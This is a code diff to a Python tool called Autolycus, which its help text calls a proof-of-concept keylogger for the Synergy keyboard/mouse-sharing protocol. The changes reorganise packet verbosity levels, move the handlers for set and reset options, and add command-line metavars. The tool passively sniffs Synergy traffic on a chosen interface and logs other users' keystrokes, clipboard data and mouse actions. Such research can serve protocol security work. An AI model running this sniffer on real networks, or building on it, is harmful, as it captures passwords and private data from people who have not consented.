@@ -17,27 +17,31 @@ class Autolycus(object):
 
     # packet type constants
     PACKET = {
+        # verbosity level 0
         "HANDSHAKE": "handshake",
         "QUERY_INFO": "qinf",
         "CLIENT_DATA": "clientdata",
         "SET_OPTIONS": "setoptions",
         "RESET_OPTIONS": "resetoptions",
         "ACK": "ack", 
-        "KEEP_ALIVE": "calv",
-        "MOUSE_MOVEMENT": "mousemoved",
-        "MOUSE_DOWN": "mousebuttonpressed",
-        "MOUSE_UP": "mousebuttonreleased",
         "KEYSTROKE_DOWN": "keypressed",
         "KEYSTROKE_UP": "keyreleased",
         "KEYSTROKE_REPEAT": "keyautorepeat",
         "CLIPBOARD": "clipboard",
         "CLIPBOARD_DATA": "clipboarddata",
-        "NO_OPERATION": "cnop",
-        "UNKNOWN": "unknown",
-        "LEAVING_SCREEN": "cout",
         "ENTERING_SCREEN": "cinn",
+        "LEAVING_SCREEN": "cout",
         "CLOSE_CONNECTION": "cbye",
-        "CONNECTION_BUSY": "ebsy"
+        "CONNECTION_BUSY": "ebsy",
+        # verbosity level 1
+        "MOUSE_DOWN": "mousebuttonpressed",
+        "MOUSE_UP": "mousebuttonreleased",
+        # verbosity level 2
+        "KEEP_ALIVE": "calv",
+        "UNKNOWN": "unknown",
+        # verbosity level 3
+        "MOUSE_MOVEMENT": "mousemoved",
+        "NO_OPERATION": "cnop"
     }
 
     # non-ASCII keycodes
@@ -124,6 +128,10 @@ class Autolycus(object):
                             self.handle_query_info(packet)
                         elif packet_type == self.PACKET["CLIENT_DATA"]:
                             self.handle_client_data(packet)
+                        elif packet_type == self.PACKET["SET_OPTIONS"]:
+                            self.handle_set_options(packet)
+                        elif packet_type == self.PACKET["RESET_OPTIONS"]:
+                            self.handle_reset_options(packet)
                         elif packet_type == self.PACKET["ACK"]:
                             self.handle_ack(packet)
                         elif packet_type == self.PACKET["KEYSTROKE_DOWN"]:
@@ -152,11 +160,7 @@ class Autolycus(object):
                             # redundant packet, catch and ignore
                             pass
                     if self.verbose_level >= 2:
-                        if packet_type == self.PACKET["SET_OPTIONS"]:
-                            self.handle_set_options(packet)
-                        elif packet_type == self.PACKET["RESET_OPTIONS"]:
-                            self.handle_reset_options(packet)
-                        elif packet_type == self.PACKET["KEEP_ALIVE"]:
+                        if packet_type == self.PACKET["KEEP_ALIVE"]:
                             self.handle_keep_alive(packet)
                         elif packet_type == self.PACKET["UNKNOWN"]:
                             self.handle_unknown(packet)
@@ -182,13 +186,20 @@ class Autolycus(object):
     def handle_query_info(self, packet):
         self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) requesting screen settings")
 
-    def handle_ack(self, packet):
-        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) acknowledged sent settings")
-
     def handle_client_data(self, packet):
         self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) confirming server screen settings")
         for field in packet.synergy._get_all_fields_with_alternates()[1:]:
             self.log.log(self.SETUP, f"\t{packet.synergy._get_field_repr(field)}")
+
+    def handle_set_options(self, packet):
+        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) set options:")
+        self.log.log(self.DATA, f"\t {packet.synergy.setoptions}")\
+
+    def handle_reset_options(self, packet):
+        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) reset options")
+
+    def handle_ack(self, packet):
+        self.log.log(self.SETUP, f"({packet.ip.src} --> {packet.ip.dst}) acknowledged sent settings")
 
     def handle_keystroke(self, packet):
         if len(self.temp_keystrokes[packet.ip.src + packet.ip.dst]) == 0:
@@ -272,13 +283,6 @@ class Autolycus(object):
         self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) mouse action:")
         self.log.log(self.DATA, f"\t<{self.MOUSE_CODES[int(packet.synergy.mousebuttonpressed)]}>")
 
-    def handle_set_options(self, packet):
-        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) set options:")
-        self.log.log(self.DATA, f"\t {packet.synergy.setoptions}")\
-
-    def handle_reset_options(self, packet):
-        self.log.log(self.INFO, f"({packet.ip.src} --> {packet.ip.dst}) reset options")
-
     def handle_keep_alive(self, packet):
         if not self.processing_keep_alive:
             self.processing_keep_alive = True
@@ -353,10 +357,10 @@ class Autolycus(object):
 def main():
     parser = argparse.ArgumentParser(description="A proof of concept keylogger for the Synergy protocol.", formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument("interface", help="The interface to listen on.", type=str)
-    parser.add_argument("-w", "--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", type=int, default=200)
-    parser.add_argument("-k", "--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", type=int, default=5)
-    parser.add_argument("-r", "--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", type=int, default=1)
-    parser.add_argument("-v", "--verbose", help="The level of verbosity, with each level adding more. Default = 0.\n0: keystrokes, clipboards, connection, and screen movement\n1: mouse clicks\n2: options, keep alives, unknowns, and random noisy packets\n3:mouse movement and NOPs\n4: any uncaught packets", type=int, default=0)
+    parser.add_argument("-w", "--wrap_limit", help="The max amount of characters to print on a single line when dumping keystrokes/clipboard data.", metavar="num chars", type=int, default=200)
+    parser.add_argument("-k", "--keystroke_wait_time", help="The time in seconds to wait without hearing new keystrokes before printing the dump.", metavar="seconds", type=int, default=5)
+    parser.add_argument("-r", "--redundant_wait_time", help="The time in seconds to wait before printing actions which commonly contain duplicates. Longer window = less duplicates.", metavar="seconds", type=int, default=1)
+    parser.add_argument("-v", "--verbose", help="The level of verbosity, with each level adding more. Default = 0.\n0: keystrokes, clipboards, connection, and screen movement\n1: mouse clicks\n2: keep alives, unknowns, and random noisy packets\n3:mouse movement and NOPs\n4: any uncaught packets", metavar="level", type=int, default=0)
     args = parser.parse_args()
 
     autolycus = Autolycus(args.interface, args.wrap_limit, args.keystroke_wait_time, args.redundant_wait_time, args.verbose)
